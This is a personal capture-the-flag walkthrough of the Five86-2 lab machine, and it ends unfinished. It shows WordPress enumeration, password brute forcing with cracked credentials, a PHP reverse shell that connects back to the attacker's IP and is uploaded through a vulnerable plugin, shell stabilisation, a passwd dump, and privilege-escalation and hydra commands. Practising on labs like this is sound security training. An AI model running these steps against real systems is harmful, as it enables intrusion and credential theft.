# Five86-2

---

Notes

Discovery 

    
    netdiscover -i eth0 -r 192.168.61.1/24

![Five86%202/five0.png](Five86%202/five0.png)

Scan

    nmap -sV -sC 192.168.61.222

![Five86%202/five1.png](Five86%202/five1.png)

WordPress

    wpscan --url http://192.168.61.222 --api-token [TOKEN] --enumerate u p -o ~/wpscan.json -f json

 Findings Summary

    "Server: Apache/2.4.41 (Ubuntu)"
    "url": "http://192.168.61.222/xmlrpc.php"
    "to_s": "Upload directory has listing enabled: http://192.168.61.222/wp-content/uploads/"
    "url": "http://192.168.61.222/readme.html"
    "url": "http://192.168.61.222/wp-cron.php"
    **"Version number": "5.1.4",
    "users": {"barney","peter","admin","gillian","stephen":}**
    

bruteforce users  attack

    sudo wpscan --url http://192.168.61.222 --usernames 'barney,peter,admin,gillian,stephen' --passwords /usr/share/wordlists/rockyou.txt
    	

    NOTE: Gem::Specification#rubyforge_project= is deprecated with no replacement. It will be removed on or after 2019-12-01.
    Gem::Specification#rubyforge_project= called from /usr/share/rubygems-integration/all/specifications/i18n-0.7.0.gemspec:20.
    _______________________________________________________________
             __          _______   _____
             \ \        / /  __ \ / ____|
              \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
               \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                \  /\  /  | |     ____) | (__| (_| | | | |
                 \/  \/   |_|    |_____/ \___|\__,_|_| |_|
    
             WordPress Security Scanner by the WPScan Team
                             Version 3.7.9
           Sponsored by Automattic - https://automattic.com/
           @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
    _______________________________________________________________
    
    [+] URL: http://192.168.61.222/ [192.168.61.222]
    [+] Started: Mon Mar  2 19:23:43 2020
    
    Interesting Finding(s):
    
    [+] Headers
     | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
     | Found By: Headers (Passive Detection)
     | Confidence: 100%
    
    [+] XML-RPC seems to be enabled: http://192.168.61.222/xmlrpc.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
     |  - http://codex.wordpress.org/XML-RPC_Pingback_API
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
    
    [+] http://192.168.61.222/readme.html
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
    
    [+] Upload directory has listing enabled: http://192.168.61.222/wp-content/uploads/
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
    
    [+] http://192.168.61.222/wp-cron.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 60%
     | References:
     |  - https://www.iplocation.net/defend-wordpress-from-ddos
     |  - https://github.com/wpscanteam/wpscan/issues/1299
    
    [+] WordPress version 5.1.4 identified (Latest, released on 2019-12-12).
     | Found By: Emoji Settings (Passive Detection)
     |  - http://192.168.61.222/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.1.4'
     | Confirmed By: Meta Generator (Passive Detection)
     |  - http://192.168.61.222/, Match: 'WordPress 5.1.4'
    
    [i] The main theme could not be detected.
    
    [+] Enumerating All Plugins (via Passive Methods)
    
    [i] No plugins Found.
    
    [+] Enumerating Config Backups (via Passive and Aggressive Methods)
     Checking Config Backups - Time: 00:00:00 <=======================================================================================================> (21 / 21) 100.00% Time: 00:00:00
    [i] No Config Backups Found.
    
    [+] Performing password attack on Xmlrpc against 5 user/s
    [SUCCESS] - barney / spooky1
    [SUCCESS] - stephen / apollo1
    Trying peter / 120807 Time: 00:23:47 <                                                                                                    > (98765 / 43062497)  0.22%  ETA: ??:??:??^Cying admin / tacotaco Time: 00:49:54 <                                                                                                 > (202980 / 43062497)  0.47%  ETA: ??:??:??[i] Valid Combinations Found:
     | Username: barney, Password: spooky1
     | Username: stephen, Password: apollo1
    
    [!] No WPVulnDB API Token given, as a result vulnerability data has not been output.                                                     > (202985 / 43062497)  0.47%  ETA: ??:??:??[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
    
    [+] Finished: Mon Mar  2 20:13:56 2020
    [+] Requests Done: 203029
    [+] Cached Requests: 11
    [+] Data Sent: 98.329 MB
    [+] Data Received: 119.479 MB
    [+] Memory used: 1.088 GB
    [+] Elapsed time: 00:50:1
    
    
    
    

![Five86%202/fiveusers.png](Five86%202/fiveusers.png)

login using barney and looked at plugins 

![Five86%202/word.png](Five86%202/word.png)

quick google search and 

[https://www.exploit-db.com/exploits/46981](https://www.exploit-db.com/exploits/46981)

created two files with this 

1.php

    <?php
    exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.61.144/888 0>&1'");

index.html

    <html>
    hi
    </html>

saved it to rev.zip 

and uploaded it using the plugin and publish content.

![Five86%202/added.png](Five86%202/added.png)

setup netcat for listening 

    nc -lv -p 888

goto to view uploaded content (look at recon )

     [http://192.168.61.222/wp-content/uploads/articulate_uploads/rev/](http://192.168.61.222/wp-content/uploads/articulate_uploads/ermi/)1.php
    

![Five86%202/netcat.png](Five86%202/netcat.png)

make it interactive 

/bin/sh -i

python -c 'import pty;pty.spawn("/bin/bash")'

python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm 

export TERM=bash

look for passwords

view available users

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
    syslog:x:104:110::/home/syslog:/usr/sbin/nologin
    _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
    uuidd:x:106:111::/run/uuidd:/usr/sbin/nologin
    tcpdump:x:107:112::/nonexistent:/usr/sbin/nologin
    landscape:x:108:114::/var/lib/landscape:/usr/sbin/nologin
    pollinate:x:109:1::/var/cache/pollinate:/bin/false
    sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
    lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
    mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
    barney:x:1001:1001:Barney Sumner:/home/barney:/bin/bash
    **stephen:x:1002:1002:Stephen Morris:/home/stephen:/bin/bash**
    peter:x:1003:1003:Peter Hook:/home/peter:/bin/bash
    gillian:x:1004:1004:Gillian Gilbert:/home/gillian:/bin/bash
    richard:x:1005:1005:Richard Starkey:/home/richard:/bin/bash
    paul:x:1006:1006:Paul McCartney:/home/paul:/bin/bash
    john:x:1007:1007:John Lennon:/home/john:/bin/bash
    george:x:1008:1008:George Harrison:/home/george:/bin/bash
    dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin

TRY

    su barney 
    and 
    su stephen 
    
    
    
    stephen worked

mysql -udbuser -p4Te3bRd483e -e "show databases;"

./sudo_killer.sh -c -i /path/sk_offline.txt

./sudo.sh -c -e -r report.txt -p /tmp

hydra -L fusers.txt -P /usr/share/wordlists/rockyou.txt [ftp://192.168.61.222](ftp://192.168.61.222/)

define( 'DB_PASSWORD', '4Te3bRd483e' );define( 'DB_PASSWORD', 'password_here' ); case 'DB_PASSWORD': define( 'DB_PASSWORD', $pwd );